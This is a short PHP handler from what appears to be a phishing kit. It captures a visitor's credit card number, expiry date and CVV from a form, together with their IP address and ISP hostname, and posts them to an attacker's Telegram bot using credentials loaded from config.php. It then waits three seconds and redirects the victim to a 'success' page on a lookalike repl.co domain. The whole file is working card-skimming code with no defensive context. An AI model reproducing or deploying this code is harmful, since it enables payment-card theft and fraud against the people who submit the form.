<?php
$ip = getenv("REMOTE_ADDR");
$isp = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$cc = $_POST['cc'];
$mm = $_POST['mm'];
$cvv = $_POST['cvv'];


$msg ="
\n$cc | $mm | $cvv  | $ip|  $isp
";


//Envio Telegram	
include("config.php");

	$urlMsg = "https://api.telegram.org/bot{$token}/sendMessage";
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $urlMsg);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id={$id}&parse_mode=HTML&text=$msg");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

	$server_output = curl_exec($ch);
	curl_close($ch);

//Envio txt
//$archivo=fopen("qq.txt","a");
//fwrite($archivo,$msg);

sleep(3);
header("Location: https://clientes.cenconsud.repl.co/Exito.html");
exit();



?>
